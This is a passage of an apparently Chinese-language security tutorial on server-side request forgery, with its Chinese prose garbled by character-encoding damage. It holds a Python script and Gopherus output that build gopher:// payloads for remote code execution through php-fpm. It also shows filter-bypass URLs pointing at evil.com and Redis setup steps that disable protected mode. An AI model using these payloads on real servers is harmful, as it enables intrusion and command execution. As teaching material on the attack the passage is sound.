class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;host&#x27;</span>, help=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, help=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, help=<span class="string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, help=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % len(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#è¿™é‡Œè°ƒç”¨request,ç„¶åè¿”å›tcpæ•°æ®æµ,æ‰€ä»¥ä¿®æ”¹è¿™é‡Œurlç¼–ç ä¸€ä¸‹å°±å¥½äº†</span></span><br><span class="line">    <span class="comment">#response = client.request(params, content)</span></span><br><span class="line">    <span class="comment">#print(force_text(response))</span></span><br><span class="line">    request_ssrf = urlparse.quote(client.request(params, content))</span><br><span class="line">    print(force_text(<span class="string">&quot;gopher://127.0.0.1:&quot;</span> + str(args.port) + <span class="string">&quot;/_&quot;</span> + request_ssrf))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191210182034.png" alt=""></p>
<blockquote>
<p>åœ¨åˆ©ç”¨æ—¶ï¼Œè¿˜è¦å¯¹å…¶urlencodeä¸€æ¬¡ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨Burpçš„Convert SelectionåŠŸèƒ½ï¼š</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191210182946.png" alt=""></p>
<p>okï¼ŒæˆåŠŸå®ç°äº†ä»£ç æ‰§è¡Œã€‚</p>
<p>ç¬¬ä¸‰ç§å°±æ˜¯ä½¿ç”¨<a href="https://github.com/tarunkant/Gopherus">gopherus</a>å·¥å…·ï¼ŒåŒæ ·éå¸¸å¥½ç”¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Desktop gopherus --exploit fastcgi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ________              .__</span><br><span class="line"> &#x2F;  _____&#x2F;  ____ ______ |  |__   ___________ __ __  ______</span><br><span class="line">&#x2F;   \  ___ &#x2F;  _ \\____ \|  |  \_&#x2F; __ \_  __ \  |  \&#x2F;  ___&#x2F;</span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___&#x2F;|  | \&#x2F;  |  &#x2F;\___ \</span><br><span class="line"> \______  &#x2F;\____&#x2F;|   __&#x2F;|___|  &#x2F;\___  &gt;__|  |____&#x2F;&#x2F;____  &gt;</span><br><span class="line">        \&#x2F;       |__|        \&#x2F;     \&#x2F;                 \&#x2F;</span><br><span class="line"></span><br><span class="line">		author: $_SpyD3r_$</span><br><span class="line"></span><br><span class="line">Give one file name which should be surely present in the server (prefer .php file)</span><br><span class="line">if you don&#39;t know press ENTER we have default one:  &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</span><br><span class="line">Terminal command to run:  whoami</span><br><span class="line"></span><br><span class="line">Your gopher link is ready to do SSRF: </span><br><span class="line"></span><br><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br><span class="line"></span><br><span class="line">-----------Made-by-SpyD3r-----------</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payloadåœ¨åˆ©ç”¨æ—¶éœ€è¦å†æ¬¡è¿›è¡Œurlç¼–ç ã€‚</p>
<h2 id="ç»•è¿‡æ–¹å¼">ç»•è¿‡æ–¹å¼</h2>
<p><a href="https://www.freebuf.com/articles/web/135342.html">https://www.freebuf.com/articles/web/135342.html</a></p>
<p>æ€»çš„æ¥è¯´æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p>
<h3 id="IPåœ°å€è¿›åˆ¶è½¬æ¢">IPåœ°å€è¿›åˆ¶è½¬æ¢</h3>
<p>ä¾‹å¦‚192.168.0.1è¿™ä¸ªIPåœ°å€æˆ‘ä»¬å¯ä»¥æ”¹å†™æˆï¼š</p>
<blockquote>
<p>(1)ã€8è¿›åˆ¶æ ¼å¼ï¼š0300.0250.0.1</p>
<p>(2)ã€16è¿›åˆ¶æ ¼å¼ï¼š0xC0.0xA8.0.1</p>
<p>(3)ã€10è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š3232235521</p>
<p>(4)ã€16è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š0xC0A80001</p>
</blockquote>
<h3 id="åˆ©ç”¨è§£æURLæ‰€å‡ºç°çš„é—®é¢˜">åˆ©ç”¨è§£æURLæ‰€å‡ºç°çš„é—®é¢˜</h3>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåç«¯ç¨‹åºå¯èƒ½ä¼šå¯¹è®¿é—®çš„URLè¿›è¡Œè§£æï¼Œå¯¹è§£æå‡ºæ¥çš„hoståœ°å€è¿›è¡Œè¿‡æ»¤ã€‚è¿™æ—¶å€™å¯èƒ½ä¼šå‡ºç°å¯¹URLå‚æ•°è§£æä¸å½“ï¼Œå¯¼è‡´å¯ä»¥ç»•è¿‡è¿‡æ»¤ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.baidu.com@192.168.0.1&#x2F;</span><br></pre></td></tr></table></figure>
<p>å½“åç«¯ç¨‹åºé€šè¿‡ä¸æ­£ç¡®çš„æ­£åˆ™è¡¨è¾¾å¼ï¼ˆæ¯”å¦‚å°†httpä¹‹ååˆ°comä¸ºæ­¢çš„å­—ç¬¦å†…å®¹ï¼Œä¹Ÿå°±æ˜¯\<a href="http://www.baidu.com">www.baidu.com</a>ï¼Œè®¤ä¸ºæ˜¯è®¿é—®è¯·æ±‚çš„hoståœ°å€æ—¶ï¼‰å¯¹ä¸Šè¿°URLçš„å†…å®¹è¿›è¡Œè§£æçš„æ—¶å€™ï¼Œ<a href="http://xn--URLhostwww-xx2pha710a1tzo64bgdzac98cwnybok4bqpa697o.baidu.com">å¾ˆæœ‰å¯èƒ½ä¼šè®¤ä¸ºè®¿é—®URLçš„hostä¸ºwww.baidu.com</a>ï¼Œè€Œå®é™…ä¸Šè¿™ä¸ªURLæ‰€è¯·æ±‚çš„å†…å®¹éƒ½æ˜¯192.168.0.1ä¸Šçš„å†…å®¹ã€‚</p>
<h3 id="filter-var-bypass">filter_var() bypass</h3>
<p>çœ‹åˆ°å¾ˆå¤šå¤§ä½¬çš„æ–‡ç« éƒ½æœ‰æåˆ°ï¼Œæ‰¾åˆ°<a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51">åŸæ–‡é“¾æ¥</a></p>
<p><strong>ç¤ºä¾‹ä»£ç </strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">   echo &quot;Argument: &quot;.$url.&quot;\n&quot;;</span><br><span class="line">   if(filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      $r &#x3D; parse_url($url);</span><br><span class="line">      var_dump($r);</span><br><span class="line">      if(preg_match(&#39;&#x2F;google\.com$&#x2F;&#39;, $r[&#39;host&#39;])) </span><br><span class="line">      &#123;</span><br><span class="line">         exec(&#39;curl -v -s &quot;&#39;.$r[&#39;host&#39;].&#39;&quot;&#39;, $a);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">         echo &quot;Error: Host not allowed&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">      echo &quot;Error: Invalid URL&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br><span class="line">mixed filter_var ( mixed $variable [, int $filter &#x3D; FILTER_DEFAULT [, mixed $options ]] )å‡½æ•°æœ‰ä¸¤ç§å‚æ•°ã€‚</span><br><span class="line">FILTER_VALIDATE_EMAIL æ£€æŸ¥æ˜¯å¦ä¸ºæœ‰æ•ˆé‚®ç®±</span><br><span class="line">FILTER_VALIDATE_URL æ£€æŸ¥æ˜¯å¦ä¸ºæœ‰æ•ˆurl</span><br></pre></td></tr></table></figure>
<p>ä»£ç çš„é€»è¾‘æ˜¯å…ˆåˆ¤æ–­ï¼Œurlæ˜¯å¦ç¬¦åˆé€»è¾‘ï¼Œç¬¦åˆåˆ™ç”¨<code>preg_match</code>æ¥åŒ¹é…ï¼ŒåŒ¹é…æˆåŠŸå°±curl</p>
<p>ç»•è¿‡æ–¹å¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;web&#x2F;test&#x2F;22.php?url&#x3D;0:&#x2F;&#x2F;evil.com:80,google.com:80&#x2F;</span><br><span class="line">æˆ–</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;web&#x2F;test&#x2F;22.php?url&#x3D;0:&#x2F;&#x2F;evil.com:23333;google.com:80&#x2F;</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨ï¼Œæˆ–è€…ï¼›å¯ä»¥ç»•è¿‡ã€‚</p>
<h3 id="åˆ©ç”¨302è·³è½¬">åˆ©ç”¨302è·³è½¬</h3>
<p>å¦‚æœåç«¯æœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°å‚æ•°åï¼Œæ­£ç¡®çš„è§£æäº†URLçš„hostï¼Œå¹¶ä¸”è¿›è¡Œäº†è¿‡æ»¤ï¼Œæˆ‘ä»¬è¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨302è·³è½¬çš„æ–¹å¼æ¥è¿›è¡Œç»•è¿‡ã€‚</p>
<p>(1)ã€åœ¨ç½‘ç»œä¸Šå­˜åœ¨ä¸€ä¸ªå¾ˆç¥å¥‡çš„æœåŠ¡ï¼Œ<a href="http://xip.io/">http://xip.io</a> å½“æˆ‘ä»¬è®¿é—®è¿™ä¸ªç½‘ç«™çš„å­åŸŸåçš„æ—¶å€™ï¼Œ<a href="http://xn--192-uc0ep96b.168.0.1.xip.io">ä¾‹å¦‚192.168.0.1.xip.io</a>ï¼Œå°±ä¼šè‡ªåŠ¨é‡å®šå‘åˆ°192.168.0.1ã€‚</p>
<p>(2)ã€ç”±äºä¸Šè¿°æ–¹æ³•ä¸­åŒ…å«äº†192.168.0.1è¿™ç§å†…ç½‘IPåœ°å€ï¼Œå¯èƒ½ä¼šè¢«æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤æ‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡çŸ­åœ°å€çš„æ–¹å¼æ¥ç»•è¿‡ã€‚ç»è¿‡æµ‹è¯•å‘ç°æ–°æµªï¼Œç™¾åº¦çš„çŸ­åœ°å€æœåŠ¡å¹¶ä¸æ”¯æŒIPæ¨¡å¼ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨çš„æ˜¯<a href="http://tinyurl.com/">http://tinyurl.com</a>æ‰€æä¾›çš„çŸ­åœ°å€æœåŠ¡ã€‚ï¼ˆç°åœ¨è¿™ä¸ªç½‘ç«™å·²ç»å…³é—­äº†ï¼‰</p>
<h2 id="Appendix-A">Appendix A</h2>
<h3 id="PHPçš„è¿æ¥æ–¹å¼">PHPçš„è¿æ¥æ–¹å¼</h3>
<p>æ‰€è°“çš„è¿æ¥æ–¹å¼æŒ‡çš„å°±æ˜¯æœåŠ¡å™¨ä¸­é—´ä»¶ä¸æŸä¸ªè¯­è¨€åç«¯è¿›è¡Œæ•°æ®äº¤æ¢çš„æ–¹å¼ã€‚åœ¨è¿™é‡Œå…·ä½“è€Œè¨€å°±æ˜¯PHPè¯­è¨€å’ŒApacheæˆ–è€…Nginxè¿›è¡Œæ•°æ®ä¼ è¾“çš„æ–¹å¼ã€‚ä¸€å…±æœ‰ä¸‰ç§apache2-moduleã€CGIã€FastCGIï¼š</p>
<h4 id="apache2-moduleæ¨¡å¼">apache2-moduleæ¨¡å¼</h4>
<p>æŠŠ php å½“åš apache çš„ä¸€ä¸ªæ¨¡å—ï¼Œå®é™…ä¸Š php å°±ç›¸å½“äº apache ä¸­çš„ä¸€ä¸ª dll æˆ–ä¸€ä¸ª so æ–‡ä»¶ï¼Œphpstudy çš„é nts æ¨¡å¼å°±æ˜¯é»˜è®¤ä»¥ module æ–¹å¼è¿æ¥çš„ã€‚</p>
<h4 id="CGIæ¨¡å¼">CGIæ¨¡å¼</h4>
<p>æ­¤æ—¶ php æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹æ¯”å¦‚ php-cgi.exeï¼Œweb æœåŠ¡å™¨ä¹Ÿæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹æ¯”å¦‚ apache.exeï¼Œç„¶åå½“ Web æœåŠ¡å™¨ç›‘å¬åˆ° HTTP è¯·æ±‚æ—¶ï¼Œä¼šå»è°ƒç”¨ php-cgi è¿›ç¨‹ï¼Œä»–ä»¬ä¹‹é—´é€šè¿‡ cgi åè®®ï¼ŒæœåŠ¡å™¨æŠŠè¯·æ±‚å†…å®¹è½¬æ¢æˆ php-cgi èƒ½è¯»æ‡‚çš„åè®®æ•°æ®ä¼ é€’ç»™ cgi è¿›ç¨‹ï¼Œcgi è¿›ç¨‹æ‹¿åˆ°å†…å®¹å°±ä¼šå»è§£æå¯¹åº” php æ–‡ä»¶ï¼Œå¾—åˆ°çš„è¿”å›ç»“æœåœ¨è¿”å›ç»™ web æœåŠ¡å™¨ï¼Œæœ€å web æœåŠ¡å™¨è¿”å›åˆ°å®¢æˆ·ç«¯ï¼Œä½†éšç€ç½‘ç»œæŠ€æœ¯çš„å‘å±•ï¼ŒCGI æ–¹å¼çš„ç¼ºç‚¹ä¹Ÿè¶Šæ¥è¶Šçªå‡ºã€‚æ¯æ¬¡å®¢æˆ·ç«¯è¯·æ±‚éƒ½éœ€è¦å»ºç«‹å’Œé”€æ¯è¿›ç¨‹ã€‚å› ä¸º HTTP è¦ç”Ÿæˆä¸€ä¸ªåŠ¨æ€é¡µé¢ï¼Œç³»ç»Ÿå°±å¿…é¡»å¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹ä»¥è¿è¡Œ CGI ç¨‹åºï¼Œä¸æ–­åœ° fork æ˜¯ä¸€é¡¹å¾ˆæ¶ˆè€—æ—¶é—´å’Œèµ„æºçš„å·¥ä½œã€‚</p>
<h4 id="FastCGIæ¨¡å¼">FastCGIæ¨¡å¼</h4>
<p>fastcgi æœ¬èº«è¿˜æ˜¯ä¸€ä¸ªåè®®ï¼Œåœ¨ cgi åè®®ä¸Šè¿›è¡Œäº†ä¸€äº›ä¼˜åŒ–ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼ŒCGI è¿›ç¨‹çš„åå¤åŠ è½½æ˜¯ CGI æ€§èƒ½ä½ä¸‹çš„ä¸»è¦åŸå› ï¼Œå¦‚æœ CGI è§£é‡Šå™¨ä¿æŒåœ¨å†…å­˜ä¸­ å¹¶æ¥å—FastCGI è¿›ç¨‹ç®¡ç†å™¨è°ƒåº¦ï¼Œåˆ™å¯ä»¥æä¾›è‰¯å¥½çš„æ€§èƒ½ã€ä¼¸ç¼©æ€§ã€Fail-Over ç‰¹æ€§ç­‰ç­‰ã€‚</p>
<p>ç®€è€Œè¨€ä¹‹ï¼ŒCGI æ¨¡å¼æ˜¯ apache2 æ¥æ”¶åˆ°è¯·æ±‚å»è°ƒç”¨ CGI ç¨‹åºï¼Œè€Œ fastcgi æ¨¡å¼æ˜¯ fastcgi è¿›ç¨‹è‡ªå·±ç®¡ç†è‡ªå·±çš„ cgi è¿›ç¨‹ï¼Œè€Œä¸å†æ˜¯ apache å»ä¸»åŠ¨è°ƒç”¨ php-cgiï¼Œè€Œ fastcgi è¿›ç¨‹åˆæä¾›äº†å¾ˆå¤šè¾…åŠ©åŠŸèƒ½æ¯”å¦‚å†…å­˜ç®¡ç†ï¼Œåƒåœ¾å¤„ç†ï¼Œä¿éšœäº† cgi çš„é«˜æ•ˆæ€§ï¼Œå¹¶ä¸” CGI æ­¤æ—¶æ˜¯å¸¸é©»åœ¨å†…å­˜ä¸­ï¼Œä¸ä¼šæ¯æ¬¡è¯·æ±‚é‡æ–°å¯åŠ¨ã€‚</p>
<p>åœ¨æ¥è§¦ä¸åˆ°æœåŠ¡å™¨æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>phpinfo()</code>ä¸­çš„<code>Server API</code>æ¥åˆ¤æ–­PHPçš„è¿æ¥æ–¹å¼ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191209225549.png" alt=""></p>
<p>å¯¹äºFastCGIåè®®çš„å…·ä½“åˆ†æå‚è€ƒPç‰›çš„åšå®¢ï¼š<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
<h3 id="PHP-FPM">PHP-FPM</h3>
<h4 id="åŸºæœ¬æ¦‚å¿µ">åŸºæœ¬æ¦‚å¿µ</h4>
<p>å®˜æ–¹å®šä¹‰å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>FPMï¼ˆFastCGI è¿›ç¨‹ç®¡ç†å™¨ï¼‰ç”¨äºæ›¿æ¢ PHP FastCGI çš„å¤§éƒ¨åˆ†é™„åŠ åŠŸèƒ½ï¼Œå¯¹äºé«˜è´Ÿè½½ç½‘ç«™æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚</p>
</blockquote>
<p>ç®€å•åœ°è¯´ï¼ŒFPMæ˜¯å®ç°å’Œç®¡ç†FastCGIè¿›ç¨‹çš„ç®¡ç†å™¨ï¼Œèƒ½å¤Ÿæ¥æ”¶æœåŠ¡å™¨ä¸­é—´ä»¶å‘é€çš„FastCGIåè®®åŒ…å¹¶è¿›è¡Œè§£æã€æœ€åå°†è§£æç»“æœè¿”å›ç»™æœåŠ¡å™¨ä¸­é—´ä»¶ã€‚</p>
<p>è¿™é‡Œå€Ÿç”¨å…ˆçŸ¥çš„ä¸€ä¸ªå›¾æ¥çœ‹çœ‹å°±æ¸…æ¥šäº†ï¼š</p>
<p><img src="https://www.mi1k7ea.com/2019/08/25/%E6%B5%85%E8%B0%88PHP-FPM%E5%AE%89%E5%85%A8/1.png" alt="img"></p>
<h4 id="é€šä¿¡æ–¹å¼">é€šä¿¡æ–¹å¼</h4>
<p>åœ¨PHPä½¿ç”¨FastCGIè¿æ¥æ¨¡å¼çš„æƒ…å†µä¸‹ï¼ŒWebæœåŠ¡å™¨ä¸­é—´ä»¶å¦‚Nginxå’ŒPHP-FPMä¹‹é—´çš„é€šä¿¡æ–¹å¼åˆåˆ†ä¸ºä¸¤ç§ï¼š</p>
<h5 id="TCPæ¨¡å¼">TCPæ¨¡å¼</h5>
<p>TCPæ¨¡å¼å³æ˜¯PHP-FPMè¿›ç¨‹ä¼šç›‘å¬æœ¬æœºä¸Šçš„ä¸€ä¸ªç«¯å£ï¼ˆé»˜è®¤ä¸º9000ï¼‰ï¼Œç„¶åNginxä¼šæŠŠå®¢æˆ·ç«¯æ•°æ®é€šè¿‡FastCGIåè®®ä¼ ç»™9000ç«¯å£ï¼ŒPHP-FPMæ‹¿åˆ°æ•°æ®åä¼šè°ƒç”¨CGIè¿›ç¨‹è§£æã€‚</p>
<p>é€šå¸¸æˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹Nginxçš„é…ç½®æ–‡ä»¶default.confæ¥ç¡®è®¤æ˜¯å¦æ˜¯TCPæ¨¡å¼ï¼Œè¿™é‡Œä¸ªäººç¯å¢ƒä¸­çš„è·¯å¾„ä¸º<code>/etc/nginx/conf.d/default.conf</code>ï¼Œå…³æ³¨fastcgi_passè¿™ä¸€é¡¹ï¼Œè‹¥ä¸ºip+portçš„å½¢å¼å³ä¸ºTCPæ¨¡å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location ~ \.php$ &#123;      </span><br><span class="line">	index index.php index.html index.htm;      </span><br><span class="line">	include &#x2F;etc&#x2F;nginx&#x2F;fastcgi_params;      </span><br><span class="line">	fastcgi_pass 127.0.0.1:9000;      </span><br><span class="line">	fastcgi_index index.php;      </span><br><span class="line">	include fastcgi_params; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åœ¨PHP-FPMä¸­ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹å…¶é…ç½®æ–‡ä»¶ï¼Œä¸ªäººç¯å¢ƒä¸­çš„è·¯å¾„ä¸º<code>/etc/php/7.2/fpm/pool.d/www.conf</code>ï¼Œçœ‹åˆ°listenä¸€é¡¹è‹¥ä¸ºip+portçš„å½¢å¼å³ä¸ºTCPæ¨¡å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; The address on which to accept FastCGI requests.</span><br><span class="line">; Valid syntaxes are:</span><br><span class="line">;   &#39;ip.add.re.ss:port&#39;    - to listen on a TCP socket to a specific IPv4 address on</span><br><span class="line">;                            a specific port;</span><br><span class="line">;   &#39;[ip:6:addr:ess]:port&#39; - to listen on a TCP socket to a specific IPv6 address on</span><br><span class="line">;                            a specific port;</span><br><span class="line">;   &#39;port&#39;                 - to listen on a TCP socket to all addresses;                            (IPv6 and IPv4-mapped) on a specific port;</span><br><span class="line">;   &#39;&#x2F;path&#x2F;to&#x2F;unix&#x2F;socket&#39; - to listen on a unix socket.</span><br><span class="line">; Note: This value is mandatory.</span><br><span class="line">listen &#x3D; 127.0.0.1:9000</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="Unix-Socketæ¨¡å¼">Unix Socketæ¨¡å¼</h5>
<p>Unixå¥—æ¥å­—æ¨¡å¼æ˜¯Unixç³»ç»Ÿè¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰çš„ä¸€ç§è¢«å¹¿æ³›é‡‡ç”¨æ–¹å¼ï¼Œä»¥æ–‡ä»¶ï¼ˆä¸€èˆ¬æ˜¯.sockï¼‰ä½œä¸ºsocketçš„å”¯ä¸€æ ‡è¯†ï¼ˆæè¿°ç¬¦ï¼‰ï¼Œéœ€è¦é€šä¿¡çš„ä¸¤ä¸ªè¿›ç¨‹å¼•ç”¨åŒä¸€ä¸ªsocketæè¿°ç¬¦æ–‡ä»¶å°±å¯ä»¥å»ºç«‹é€šé“è¿›è¡Œé€šä¿¡äº†ã€‚</p>
<p>ç›¸æ¯”ä¹‹ä¸‹ï¼ŒUnixå¥—æ¥å­—æ¨¡å¼çš„æ€§èƒ½ä¼šä¼˜äºTCPæ¨¡å¼ã€‚</p>
<p>è¿˜æ˜¯ä¸€æ ·çš„è¯†åˆ«æ–¹æ³•ï¼Œåœ¨Nginxçš„default.confä¸­æŸ¥çœ‹fastcgi_passï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location~\.php$&#123;      </span><br><span class="line">	index index.php index.html index.htm;      </span><br><span class="line">	include &#x2F;etc&#x2F;nginx&#x2F;fastcgi_params;      </span><br><span class="line">	fastcgi_pass unix:&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock;      </span><br><span class="line">	fastcgi_index index.php;      </span><br><span class="line">	include fastcgi_params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åœ¨PHP-FPMçš„www.confä¸­æŸ¥çœ‹listenï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">listen &#x3D; &#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Appendix-B">Appendix B</h2>
<h3 id="Redis-ç¯å¢ƒæ­å»º">Redis ç¯å¢ƒæ­å»º</h3>
<ol>
<li>
<p>ç›®æ ‡æœºä¸Šå®‰è£…redisæœåŠ¡ï¼š<code>apt-get install redis</code></p>
</li>
<li>
<p>å¦‚æœè¦ä½¿å¤–ç½‘è®¿é—®ï¼š</p>
<p>æ›´æ”¹/etc/redis/redis.confé…ç½®ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> å–æ¶ˆç»‘å®šIP</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">bind</span> 127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å…è®¸åå°è¿è¡Œ</span></span><br><span class="line">daemonize yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å–æ¶ˆä¿æŠ¤æ¨¡å¼</span></span><br><span class="line">protected-mode no</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ›´æ”¹é˜²ç«å¢™é…ç½®ï¼š</p>
<p>Ubuntu18.04ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ufw allow 6379</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Centos7ï¼š</p>
